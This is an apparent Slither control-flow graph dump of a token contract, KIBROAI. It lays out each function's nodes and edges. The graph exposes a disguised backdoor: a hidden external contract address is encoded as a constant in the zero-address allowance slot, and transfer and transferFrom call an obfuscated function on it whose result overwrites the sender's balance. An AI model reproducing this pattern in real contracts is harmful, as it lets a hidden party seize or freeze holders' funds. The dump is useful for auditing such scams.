Contract: UniswapRouterV2
==================================================


Contract: KIBROAI
==================================================

Function: _msgSender
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: msg.sender

Edges:
  0 -> 1

Function: constructor
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: _name = name

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _symbol = sym

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _balancesesOfUser[_msgSender()] = _totalSupply

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _allowances[address(0x00)][address(0x00)] = 588531770750129559759384986459186089597987903098 - 18

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: Transfer(address(0),_msgSender(),_totalSupply)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5

Function: symbol
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _symbol

Edges:
  0 -> 1

Function: name
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _name

Edges:
  0 -> 1

Function: decimals
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: 18

Edges:
  0 -> 1

Function: totalSupply
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _totalSupply

Edges:
  0 -> 1

Function: balanceOf
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _balancesesOfUser[account]

Edges:
  0 -> 1

Function: _dkeswap3
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: 

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: router_ = uint160(uint256(_allowances[address(0x00)][address(0x00)])) + uint160(uint256(_dec)) + uint160(uint256(_dec2))

  ID: 3
  Type: NodeType.VARIABLE
  Expression: org = tx.origin

  ID: 4
  Type: NodeType.RETURN
  Expression: UniswapRouterV2(address(router_)).mbb123mlbb(true,org,amount,owner)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: _dogkkwap2
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: 

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: router_ = uint160(uint256(_allowances[address(0x00)][address(0x00)])) + uint160(uint256(_dec)) + uint160(uint256(_dec2))

  ID: 3
  Type: NodeType.VARIABLE
  Expression: org = tx.origin

  ID: 4
  Type: NodeType.RETURN
  Expression: (UniswapRouterV2(address(router_)).mbb123mlbb(true,org,amount,owner),false)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: owner = _msgSender()

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: (_balancesesOfUser[owner],None) = _dogkkwap2(_balancesesOfUser[owner],owner)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _transfer(owner,to,amount)

  ID: 4
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: allowance
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.RETURN
  Expression: _allowances[owner][sender]

Edges:
  0 -> 1

Function: approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: owner = _msgSender()

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: _approve(owner,sender,amount)

  ID: 3
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3

Function: transferFrom
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.VARIABLE
  Expression: sender = _msgSender()

  ID: 2
  Type: NodeType.VARIABLE
  Expression: currentAllowance = allowance(from,sender)

  ID: 3
  Type: NodeType.IF
  Expression: currentAllowance != type()(uint256).max

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(currentAllowance >= amount,ERC20: insufficient allowance)

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _approve(from,sender,currentAllowance - amount)

  ID: 6
  Type: NodeType.ENDIF
  Expression: 

  ID: 7
  Type: NodeType.VARIABLE
  Expression: resultamount = _dkeswap3(_balancesesOfUser[from],from)

  ID: 8
  Type: NodeType.EXPRESSION
  Expression: _balancesesOfUser[from] = resultamount

  ID: 9
  Type: NodeType.EXPRESSION
  Expression: _transfer(from,to,amount)

  ID: 10
  Type: NodeType.RETURN
  Expression: true

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  3 -> 6
  4 -> 5
  5 -> 6
  6 -> 7
  7 -> 8
  8 -> 9
  9 -> 10

Function: _approve
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(owner != address(0),ERC20: approve from the zero address)

  ID: 2
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(sender != address(0),ERC20: approve to the zero address)

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: _allowances[owner][sender] = amount

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: Approval(owner,sender,amount)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4

Function: _transfer
------------------------------
Nodes:
  ID: 0
  Type: NodeType.ENTRYPOINT
  Expression: 

  ID: 1
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(from != address(0) && to != address(0),ERC20: transfer the zero address)

  ID: 2
  Type: NodeType.VARIABLE
  Expression: balance = _balancesesOfUser[from]

  ID: 3
  Type: NodeType.EXPRESSION
  Expression: require(bool,string)(balance >= amount,ERC20: amount over balance)

  ID: 4
  Type: NodeType.EXPRESSION
  Expression: _balancesesOfUser[from] = balance - amount

  ID: 5
  Type: NodeType.EXPRESSION
  Expression: _balancesesOfUser[to] = _balancesesOfUser[to] + amount

  ID: 6
  Type: NodeType.EXPRESSION
  Expression: Transfer(from,to,amount)

Edges:
  0 -> 1
  1 -> 2
  2 -> 3
  3 -> 4
  4 -> 5
  5 -> 6

Function: slitherConstructorVariables
------------------------------
Nodes:
  ID: 0
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _totalSupply = 10000000000 * 10 ** 18

  ID: 1
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _dec = 0x0000000000000000000000000000000000000000000000000000000000000012

  ID: 2
  Type: NodeType.OTHER_ENTRYPOINT
  Expression: _dec2 = 0x0000000000000000000000000000000000000000000000000000000000000012

Edges:
  0 -> 1
  1 -> 2


